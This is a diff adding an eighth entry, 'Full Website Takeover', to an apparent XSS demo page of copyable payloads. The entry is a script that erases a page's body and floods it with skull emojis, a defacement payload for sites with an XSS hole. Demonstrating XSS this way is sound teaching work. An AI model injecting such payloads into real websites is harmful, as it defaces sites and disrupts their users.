@@ -255,6 +255,28 @@ document.querySelectorAll("*").forEach(el=>{
           </pre>
           <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
         </div>
+        <!-- PAYLOAD 8 -->
+        <div class="payload-item">
+          <h3>Full Website Takeover</h3>
+          <p class="description">Deletes teh whole page and displays a skull emoji in a random position on teh screen.</p>
+          
+            <pre>
+&lt;script&gt;
+document.body.innerHTML = "";
+setInterval(() =&gt; {
+  const d = document.createElement("div");
+  d.textContent = "💀";
+  d.style.position = "fixed";
+  d.style.left = Math.random() * 100 + "vw";
+  d.style.top = Math.random() * 100 + "vh";
+  d.style.fontSize = (Math.random() * 80 + 20) + "px";
+  d.style.color = "#00aaff";
+  document.body.appendChild(d);
+}, 50);
+&lt;/script&gt;
+          </pre>
+          <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
+        </div>
 
         <button class="return-btn" onclick="location.href='My_Test.html'">
           ← Return to XSS Demo
